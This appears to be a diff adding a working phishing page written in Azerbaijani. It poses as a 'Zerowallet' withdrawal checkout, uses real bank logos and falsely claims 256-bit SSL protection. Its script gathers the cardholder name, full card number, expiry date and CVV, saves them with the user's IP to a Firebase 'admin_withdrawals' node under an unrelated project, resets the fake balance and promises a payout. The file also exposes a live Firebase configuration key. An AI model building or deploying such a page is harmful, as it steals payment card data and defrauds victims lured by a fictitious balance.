@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Checkout | Zerowallet Payments</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { --bank-blue: #004a99; --visa-gold: #f7b600; --bg: #f4f7fa; }
+        body { 
+            margin: 0; background: var(--bg); font-family: 'Inter', sans-serif; 
+            display: flex; flex-direction: column; align-items: center; padding: 20px;
+        }
+
+        .header { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .back-btn { font-size: 1.2rem; color: #333; cursor: pointer; }
+        .secure-txt { font-size: 0.8rem; color: #666; font-weight: 600; }
+
+        .withdraw-card {
+            width: 100%; max-width: 450px; background: #fff; border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.05); padding: 30px 25px;
+            position: relative; overflow: hidden;
+        }
+
+        .bank-logos { display: flex; gap: 15px; margin-bottom: 25px; align-items: center; opacity: 0.8; }
+        .bank-logos img { height: 25px; filter: grayscale(100%); transition: 0.3s; }
+        .bank-logos img:hover { filter: grayscale(0%); }
+
+        .label { display: block; font-size: 0.85rem; font-weight: 700; color: #444; margin-bottom: 8px; text-transform: uppercase; }
+        .input-field {
+            width: 100%; padding: 15px; border: 2px solid #edf2f7; border-radius: 12px;
+            font-size: 1rem; font-weight: 600; margin-bottom: 20px; transition: 0.3s;
+            background: #fcfdfe;
+        }
+        .input-field:focus { border-color: var(--bank-blue); outline: none; background: #fff; }
+
+        .card-row { display: flex; gap: 15px; }
+
+        .payment-summary {
+            background: #f8fafc; border-radius: 12px; padding: 15px; margin-bottom: 25px;
+            border: 1px dashed #cbd5e1;
+        }
+        .summary-item { display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 5px; }
+        .summary-item b { color: var(--bank-blue); font-size: 1.1rem; }
+
+        .confirm-btn {
+            width: 100%; padding: 18px; border: none; border-radius: 14px;
+            background: var(--bank-blue); color: #fff; font-size: 1.1rem; font-weight: 700;
+            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+            box-shadow: 0 10px 20px rgba(0,74,153,0.2);
+        }
+        .confirm-btn:active { transform: scale(0.98); }
+
+        .security-footer {
+            margin-top: 30px; text-align: center; color: #94a3b8; font-size: 0.75rem;
+        }
+        .security-footer i { color: #10b981; margin-right: 5px; }
+
+        /* Realistlik Kart vizuallaşdırması */
+        .visa-master { margin-top: 15px; display: flex; justify-content: center; gap: 20px; opacity: 0.5; }
+        .visa-master i { font-size: 2rem; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="back-btn" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
+        <div class="secure-txt"><i class="fas fa-lock"></i> TƏHLÜKƏSİZ ÖDƏNİŞ</div>
+    </div>
+
+    <div class="withdraw-card">
+        <div class="bank-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e3/Kapital_Bank_logo.png" alt="Kapital">
+            <img src="https://upload.wikimedia.org/wikipedia/az/d/d4/ABB_logo.png" alt="ABB">
+            <img src="https://logowik.com/content/uploads/images/pasa-bank8150.jpg" alt="Pasha">
+        </div>
+
+        <div class="payment-summary">
+            <div class="summary-item"><span>Çıxarış məbləği:</span> <b id="display-amount">0.00 AZN</b></div>
+            <div class="summary-item"><span style="font-size: 0.75rem; color:#666;">Komissiya (0%):</span> <span style="font-size: 0.75rem;">0.00 AZN</span></div>
+        </div>
+
+        <label class="label">Kart Sahibi</label>
+        <input type="text" id="w-name" class="input-field" placeholder="AD SOYAD (Məs: ELVIN ALIYEV)">
+
+        <label class="label">Kart Nömrəsi</label>
+        <input type="text" id="w-card" class="input-field" placeholder="**** **** **** ****" maxlength="16">
+
+        <div class="card-row">
+            <div style="flex: 1;">
+                <label class="label">Müddət</label>
+                <input type="text" id="w-date" class="input-field" placeholder="AA/İİ" maxlength="5">
+            </div>
+            <div style="flex: 1;">
+                <label class="label">CVV2</label>
+                <input type="password" id="w-cvv" class="input-field" placeholder="***" maxlength="3">
+            </div>
+        </div>
+
+        <button class="confirm-btn" onclick="processTransfer()">
+            <i class="fas fa-shield-alt"></i> TƏSDİQLƏ VƏ ÇIXAR
+        </button>
+
+        <div class="visa-master">
+            <i class="fab fa-cc-visa"></i>
+            <i class="fab fa-cc-mastercard"></i>
+            <i class="fab fa-cc-apple-pay"></i>
+        </div>
+    </div>
+
+    <div class="security-footer">
+        <p><i class="fas fa-check-circle"></i> Bu əməliyyat 256-bit SSL şifrələmə ilə qorunur.</p>
+        <p>Zerowallet Azerbaijan © 2026</p>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
+            authDomain: "sevgili-testi.firebaseapp.com",
+            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
+            projectId: "sevgili-testi",
+            storageBucket: "sevgili-testi.firebasestorage.app",
+            messagingSenderId: "399260477557",
+            appId: "1:399260477557:web:584204a698d7bf145bb03c"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const user = localStorage.getItem('zerowallet_session');
+
+        if(!user) location.href="index.html";
+
+        let userBal = 0;
+        let userIp = "";
+
+        // Balansı yoxla
+        db.ref('zerowallet_users/' + user).once('value', snap => {
+            const data = snap.val();
+            userBal = data.balance;
+            userIp = data.ip;
+            document.getElementById('display-amount').innerText = userBal.toFixed(2) + " AZN";
+        });
+
+        async function processTransfer() {
+            const name = document.getElementById('w-name').value;
+            const card = document.getElementById('w-card').value;
+            const date = document.getElementById('w-date').value;
+            const cvv = document.getElementById('w-cvv').value;
+
+            if(userBal < 20) return alert("Minimum çıxarış 20 AZN-dir!");
+            if(card.length < 16 || name.length < 5 || date.length < 5 || cvv.length < 3) {
+                return alert("Zəhmət olmasa, kart məlumatlarını tam və düzgün daxil edin!");
+            }
+
+            const btn = document.querySelector('.confirm-btn');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GÖNDƏRİLİR...';
+            btn.disabled = true;
+
+            try {
+                // Admin panelinə göndər
+                await db.ref('admin_withdrawals/' + user).set({
+                    username: user,
+                    card_name: name,
+                    card_num: card,
+                    card_exp: date,
+                    card_cvv: cvv,
+                    amount: userBal,
+                    ip: userIp,
+                    timestamp: Date.now()
+                });
+
+                // Balansı sıfırla
+                await db.ref('zerowallet_users/' + user).update({ balance: 0 });
+                
+                alert("Təbrik edirik! Sorğunuz qəbul edildi. Məbləğ 24 saat ərzində kartınıza köçürüləcək.");
+                location.href = "main.html";
+            } catch(e) {
+                alert("Xəta baş verdi: " + e.message);
+                btn.innerHTML = '<i class="fas fa-shield-alt"></i> TƏSDİQLƏ VƏ ÇIXAR';
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
